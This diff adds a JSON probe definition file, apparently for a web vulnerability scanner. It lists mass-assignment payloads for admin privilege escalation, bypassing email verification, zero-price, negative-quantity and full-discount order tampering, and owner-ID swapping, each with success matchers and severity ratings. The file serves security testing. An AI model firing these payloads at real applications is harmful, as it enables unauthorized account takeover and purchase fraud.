@@ -1,0 +1,75 @@
+{
+  "category": "mass_assignment",
+  "contexts": {
+    "role_escalation": {
+      "description": "Privilege escalation via mass assignment",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"username\":\"test\",\"role\":\"admin\"}",
+          "description": "Add role=admin to registration/profile update",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized", "not allowed"]}],
+          "severity": "critical",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"username\":\"test\",\"is_admin\":true}",
+          "description": "Add is_admin=true to JSON body",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["forbidden", "unauthorized"]}],
+          "severity": "critical",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"username\":\"test\",\"isVerified\":true,\"emailVerified\":true}",
+          "description": "Bypass email verification via mass assignment",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "high",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "price_manipulation": {
+      "description": "Price/balance manipulation via hidden fields",
+      "tech_match": [],
+      "param_match": ["price", "amount", "total", "discount", "quantity", "cost"],
+      "probes": [
+        {
+          "payload": "{\"product_id\":1,\"quantity\":1,\"price\":0}",
+          "description": "Set price to 0 in request body",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["invalid price", "error"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{\"product_id\":1,\"quantity\":-1}",
+          "description": "Negative quantity for refund/credit",
+          "matchers": [{"type": "status", "status": [200, 201]}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{\"product_id\":1,\"discount\":100}",
+          "description": "100% discount via mass assignment",
+          "matchers": [{"type": "status", "status": [200, 201]}, {"type": "not_word", "words": ["invalid", "error"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "hidden_field_tampering": {
+      "description": "Modify hidden form fields that control authorization",
+      "tech_match": [],
+      "param_match": ["user_id", "account_id", "owner_id", "created_by", "modified_by"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Change user_id/owner_id to another user's ID",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "length_diff", "min_diff": 50}],
+          "severity": "high",
+          "confidence_boost": 35
+        }
+      ]
+    }
+  }
+}
